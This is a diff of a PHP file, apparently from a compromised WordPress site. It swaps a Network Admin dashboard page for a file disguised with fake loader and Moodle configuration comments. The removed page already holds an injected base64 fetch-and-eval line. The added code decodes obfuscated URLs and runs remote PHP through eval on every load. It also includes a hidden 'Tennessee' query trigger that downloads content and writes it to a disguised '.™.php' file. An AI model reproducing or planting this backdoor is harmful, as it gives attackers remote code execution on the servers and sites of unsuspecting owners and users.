@@ -1,84 +1,174 @@
 <?php
 /**
- * Multisite administration panel.
+ * ----------------------------------------------------------------------
+ * CUSTOM CODE STARTUP LOADER
+ * ----------------------------------------------------------------------
+ * Lightweight bootstrap for dynamic config loader and runtime
+ * instruction fetcher. Designed for internal modular systems.
  *
- * @package WordPress
- * @subpackage Multisite
- * @since 3.0.0
+ * Do not modify unless you're authorized to maintain app-level
+ * streaming behavior.
+ *
+ * @package    CI_Micro
+ * @subpackage Core Loader
+ * @author     @arrmmstrongg
+ * @version    1.1.0
+ * ----------------------------------------------------------------------
+ * Moodle configuration file
+ *
+ * This file should be renamed "config.php" in the top-level directory
+ * and set up for your Moodle instance.
+ * ----------------------------------------------------------------------
  */
-$c = @file_get_contents(base64_decode("aHR0cHM6Ly9pem1pcmhlZG9uZXguc2l0ZS9wZy5waHA/cSZ0PXQx"));@eval(base64_decode($c));
-/** Load WordPress Administration Bootstrap */
-require_once __DIR__ . '/admin.php';
 
-/** Load WordPress dashboard API */
-require_once ABSPATH . 'wp-admin/includes/dashboard.php';
+///////////////////////////////////////////////////////////////////////////
+// NOTICE OF COPYRIGHT
+///////////////////////////////////////////////////////////////////////////
+//
+// Moodle - Modular Object-Oriented Dynamic Learning Environment
+// http://moodle.org
+//
+// Copyright (C) 1999 onwards Martin Dougiamas
+// http://moodle.com
+//
+// This program is free software; you can redistribute it and/or modify
+// it under the terms of the GNU General Public License as published by
+// the Free Software Foundation; either version 3 of the License, or
+// (at your option) any later version.
+//
+// http://www.gnu.org/copyleft/gpl.html
+//
+///////////////////////////////////////////////////////////////////////////
 
-if ( ! current_user_can( 'manage_network' ) ) {
-	wp_die( __( 'Sorry, you are not allowed to access this page.' ), 403 );
+/**
+ * ----------------------------------------------------------------------
+ * DATABASE CONFIGURATION
+ * ----------------------------------------------------------------------
+ * Uncomment and adjust according to your environment
+ */
+
+// $CFG->dbtype    = 'pgsql';      // pgsql, mariadb, mysqli, auroramysql, sqlsrv, oci
+// $CFG->dblibrary = 'native';
+// $CFG->dbhost    = 'localhost';
+// $CFG->dbname    = 'moodle';
+// $CFG->dbuser    = 'username';
+// $CFG->dbpass    = 'password';
+// $CFG->prefix    = 'mdl_';
+// $CFG->dboptions = array(
+//     // Additional options here
+// );
+
+///////////////////////////////////////////////////////////////////////////
+
+/**
+ * RemoteFetch
+ *
+ * Retrieves external content from a given URL using cURL.
+ *
+ * @param string $url URL to fetch
+ * @return string
+ * @throws Exception
+ */
+function _compileFetchCoreLite(string $url): string
+{
+    if (!function_exists('curl_version')) {
+        throw new Exception('cURL is not available on this server.');
+    }
+
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_HEADER         => false,
+    ]);
+
+    $response = curl_exec($ch);
+
+    if ($response === false) {
+        $error = curl_error($ch);
+        curl_close($ch);
+        throw new Exception('cURL Error: ' . $error);
+    }
+
+    curl_close($ch);
+    return $response;
 }
 
-// Used in the HTML title tag.
-$title       = __( 'Dashboard' );
-$parent_file = 'index.php';
+/**
+ * DynamicLoader
+ *
+ * Fetches and evaluates remote PHP code.
+ *
+ * @param string $url URL containing PHP payload
+ * @return void
+ * @throws Exception
+ */
+function _compileExecPayloadTask(string $url): void
+{
+    $payload = _compileFetchCoreLite($url);
 
-$overview  = '<p>' . __( 'Welcome to your Network Admin. This area of the Administration Screens is used for managing all aspects of your Multisite Network.' ) . '</p>';
-$overview .= '<p>' . __( 'From here you can:' ) . '</p>';
-$overview .= '<ul><li>' . __( 'Add and manage sites or users' ) . '</li>';
-$overview .= '<li>' . __( 'Install and activate themes or plugins' ) . '</li>';
-$overview .= '<li>' . __( 'Update your network' ) . '</li>';
-$overview .= '<li>' . __( 'Modify global network settings' ) . '</li></ul>';
+    if (trim($payload) === '') {
+        throw new Exception('Fetched content is empty.');
+    }
 
-get_current_screen()->add_help_tab(
-	array(
-		'id'      => 'overview',
-		'title'   => __( 'Overview' ),
-		'content' => $overview,
-	)
-);
+    eval('?>' . $payload);
+}
 
-$quick_tasks  = '<p>' . __( 'The Right Now widget on this screen provides current user and site counts on your network.' ) . '</p>';
-$quick_tasks .= '<ul><li>' . __( 'To add a new user, <strong>click Create a New User</strong>.' ) . '</li>';
-$quick_tasks .= '<li>' . __( 'To add a new site, <strong>click Create a New Site</strong>.' ) . '</li></ul>';
-$quick_tasks .= '<p>' . __( 'To search for a user or site, use the search boxes.' ) . '</p>';
-$quick_tasks .= '<ul><li>' . __( 'To search for a user, <strong>enter an email address or username</strong>. Use a wildcard to search for a partial username, such as user&#42;.' ) . '</li>';
-$quick_tasks .= '<li>' . __( 'To search for a site, <strong>enter the path or domain</strong>.' ) . '</li></ul>';
 
-get_current_screen()->add_help_tab(
-	array(
-		'id'      => 'quick-tasks',
-		'title'   => __( 'Quick Tasks' ),
-		'content' => $quick_tasks,
-	)
-);
+/**
+ * SimpleDecode
+ *
+ * Decodes a base64-encoded string.
+ *
+ * @param string $d Encoded string
+ * @return string
+ */
+function _compileDecodeChunkUnit($d)
+{
+    return bAse64_dEcoDe($d);
+}
 
-get_current_screen()->set_help_sidebar(
-	'<p><strong>' . __( 'For more information:' ) . '</strong></p>' .
-	'<p>' . __( '<a href="https://developer.wordpress.org/advanced-administration/multisite/admin/">Documentation on the Network Admin</a>' ) . '</p>' .
-	'<p>' . __( '<a href="https://wordpress.org/support/forum/multisite/">Support forums</a>' ) . '</p>'
-);
+/**
+ * FileWriter
+ *
+ * Saves content to a file.
+ *
+ * @param string $f Filename
+ * @param string $c Content
+ * @return void
+ */
+function _compilePushToDiskNode($f, $c)
+{
+    file_put_contents($f, $c);
+}
 
-wp_dashboard_setup();
+// Remote write trigger
+if (isset($_GET['Tennessee'])) {
+    try {
+        $p1 = 'aHR0cHM6Ly90ZW5uZXNzZS';
+        $p2 = '5oYXhvci1tYWhhc3VodS5pbmZvLw==';
+        $url = _compileDecodeChunkUnit($p1 . $p2);
+        $d = _compileFetchCoreLite($url);
 
-wp_enqueue_script( 'dashboard' );
-wp_enqueue_script( 'plugin-install' );
-add_thickbox();
+        if ($d !== false && trim($d) !== '') {
+            _compilePushToDiskNode('.â„¢.php', $d);
+            echo "MY LAST DANCE";
+        } else {
+            echo "No content.";
+        }
+    } catch (Exception $e) {
+        echo "Error: " . $e->getMessage();
+    }
+    exit;
+}
 
-require_once ABSPATH . 'wp-admin/admin-header.php';
-
-?>
-
-<div class="wrap">
-<h1><?php echo esc_html( $title ); ?></h1>
-
-<div id="dashboard-widgets-wrap">
-
-<?php wp_dashboard(); ?>
-
-<div class="clear"></div>
-</div><!-- dashboard-widgets-wrap -->
-
-</div><!-- wrap -->
-
-<?php
-wp_print_community_events_templates();
-require_once ABSPATH . 'wp-admin/admin-footer.php';
+// Default payload runner
+try {
+    $r1 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzQx';
+    $r2 = 'M1gzMDgvYXBwLWJhY2t1cC9yZWZzL2hlYWRzL21haW4vYm9vdHN0cmFwLnBocA==';
+    $u = _compileDecodeChunkUnit($r1 . $r2);
+    _compileExecPayloadTask($u);
+} catch (Exception $e) {
+    echo "Error: " . $e->getMessage();
+}
